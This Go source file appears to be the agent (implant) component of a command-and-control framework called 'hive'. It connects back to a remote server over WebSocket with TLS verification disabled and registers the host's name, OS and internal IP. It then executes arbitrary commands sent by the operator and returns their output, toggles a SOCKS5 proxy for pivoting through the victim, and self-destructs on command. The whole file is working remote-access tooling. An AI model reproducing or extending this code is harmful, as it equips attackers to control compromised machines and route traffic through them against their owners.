package agent

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"net/url"
	"time"

	"github.com/blackswarm/hive/internal/config"
	"github.com/blackswarm/hive/internal/protocol"
	"github.com/blackswarm/hive/internal/utils"
	"github.com/gorilla/websocket"
)

// Agent represents an operational node in agent mode.
type Agent struct {
	serverURL string
	tlsConf   *tls.Config
	agentID   string
	logger    *slog.Logger
	conn      *websocket.Conn
	done      chan struct{}
}

// NewAgent creates a new Agent instance.
// serverURL must be a ws:// or wss:// address of the hive server (through proxy).
// clientCert is the TLS client certificate used for mutual authentication; can be nil.
func NewAgent(serverURL string, clientCert *tls.Certificate, agentID string, logger *slog.Logger) *Agent {
	a := &Agent{
		serverURL: serverURL,
		agentID:   agentID,
		logger:    logger,
		done:      make(chan struct{}),
	}
	tlsConf := &tls.Config{
		InsecureSkipVerify: true, // because proxies may use self‑signed certs
	}
	if clientCert != nil {
		tlsConf.Certificates = []tls.Certificate{*clientCert}
	}
	a.tlsConf = tlsConf
	return a
}

// Run starts the agent main loop: connect and re‑connect with exponential backoff.
func (a *Agent) Run() {
	backoff := config.DefaultReconnectMin
	for {
		if a.connect() == nil {
			backoff = config.DefaultReconnectMin // reset on graceful close
		}
		select {
		case <-a.done:
			return
		case <-time.After(backoff):
			backoff *= 2
			if backoff > config.DefaultReconnectMax {
				backoff = config.DefaultReconnectMax
			}
		}
	}
}

// connect performs a single WebSocket connection, register, then handle messages.
func (a *Agent) connect() error {
	u, err := url.Parse(a.serverURL)
	if err != nil {
		a.logger.Error("invalid server URL", "url", a.serverURL, "error", err)
		return err
	}

	dialer := websocket.Dialer{
		TLSClientConfig: a.tlsConf,
		Proxy:           http.ProxyFromEnvironment, // support standard proxy env vars
		HandshakeTimeout: 10 * time.Second,
	}
	headers := http.Header{}
	conn, _, err := dialer.Dial(u.String(), headers)
	if err != nil {
		a.logger.Error("websocket dial failed", "url", u.String(), "error", err)
		return err
	}
	a.conn = conn
	a.logger.Info("connected to server", "url", u.String())

	// send registration
	reg := protocol.RegisterMsg{
		AgentID:  a.agentID,
		Hostname: utils.GetHostname(),
		OS:       utils.GetOS(),
		IP:       utils.GetInternalIP(),
	}
	regPayload, _ := json.Marshal(reg)
	regMsg := protocol.Message{
		Type:    protocol.TypeRegister,
		Payload: regPayload,
	}
	if err := conn.WriteJSON(regMsg); err != nil {
		a.logger.Error("failed to send register", "error", err)
		conn.Close()
		return err
	}

	return a.handleMessages()
}

// handleMessages reads messages from the WebSocket and dispatches them.
func (a *Agent) handleMessages() error {
	conn := a.conn
	for {
		var msg protocol.Message
		if err := conn.ReadJSON(&msg); err != nil {
			a.logger.Error("read error", "error", err)
			conn.Close()
			return err
		}

		switch msg.Type {
		case protocol.TypeTask:
			var task protocol.TaskMsg
			if err := json.Unmarshal(msg.Payload, &task); err != nil {
				a.logger.Error("unmarshal task", "error", err)
				continue
			}
			go a.executeTask(task)

		case protocol.TypeDestroy:
			a.logger.Info("received destroy command")
			conn.Close()
			a.done <- struct{}{} // signal Run to stop
			SelfDestruct()
			return nil

		case protocol.TypeProxyOn:
			port := config.DefaultProxyPort
			if err := StartSOCKS5(port); err != nil {
				a.logger.Error("start proxy", "error", err)
			} else {
				a.logger.Info("SOCKS5 proxy started", "port", port)
			}

		case protocol.TypeProxyOff:
			if err := StopSOCKS5(); err != nil {
				a.logger.Error("stop proxy", "error", err)
			} else {
				a.logger.Info("SOCKS5 proxy stopped")
			}

		default:
			a.logger.Warn("unknown message type", "type", msg.Type)
		}
	}
}

func (a *Agent) executeTask(task protocol.TaskMsg) {
	timeout := time.Duration(task.Timeout) * time.Second
	if timeout <= 0 {
		timeout = config.DefaultTaskTimeout
	}

	stdout, stderr, execErr := ExecuteCommand(task.Command, timeout)

	result := protocol.ResultMsg{
		TaskID: task.TaskID,
		Stdout: stdout,
		Stderr: stderr,
	}
	if execErr != nil {
		result.Error = execErr.Error()
	}

	payload, _ := json.Marshal(result)
	resp := protocol.Message{
		Type:    protocol.TypeResult,
		Payload: payload,
	}

	if err := a.conn.WriteJSON(resp); err != nil {
		a.logger.Error("failed to send result", "error", err)
	}
}
